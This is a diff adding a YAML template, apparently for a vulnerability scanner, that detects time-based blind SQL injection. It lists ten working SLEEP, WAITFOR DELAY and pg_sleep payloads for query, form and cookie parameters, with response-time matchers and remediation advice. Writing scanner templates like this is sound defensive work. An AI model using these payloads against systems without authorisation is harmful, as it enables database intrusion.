@@ -1,0 +1,55 @@
+# SQL Injection — Time-Based Blind detection template
+
+id: sqli-time
+name: SQL Injection — Time-Based Blind
+severity: critical
+tags:
+  - sqli
+  - injection
+  - owasp-a03
+  - database
+  - blind
+description: >
+  Detects time-based blind SQL injection by injecting SLEEP/WAITFOR/pg_sleep
+  payloads and measuring whether the response time exceeds the expected
+  delay threshold. No error messages or visible data changes are needed.
+references:
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+  - https://cwe.mitre.org/data/definitions/89.html
+cwe: CWE-89
+owasp: "A03:2021-Injection"
+remediation: >
+  Use parameterised queries (prepared statements) for all database access.
+  Never concatenate user input into SQL strings.
+
+target_params:
+  - query
+  - form
+  - cookie
+payloads:
+  - "' OR SLEEP(5)--"
+  - "' OR SLEEP(5)#"
+  - "1' AND (SELECT SLEEP(5))--"
+  - "1' AND (SELECT SLEEP(5)) AND '1'='1"
+  - "'; WAITFOR DELAY '0:0:5'--"
+  - "1; WAITFOR DELAY '0:0:5'--"
+  - "'; SELECT pg_sleep(5)--"
+  - "1'; SELECT pg_sleep(5)--"
+  - "' AND 1=(SELECT 1 FROM(SELECT SLEEP(5))a)--"
+  - "1' AND pg_sleep(5) AND '1'='1"
+stop_on_first_match: true
+matchers_condition: and
+
+matchers:
+  - type: timing
+    part: response_time
+    threshold_ms: 4500
+
+  - type: status
+    part: status
+    status:
+      - 200
+      - 302
+      - 500
+    condition: or
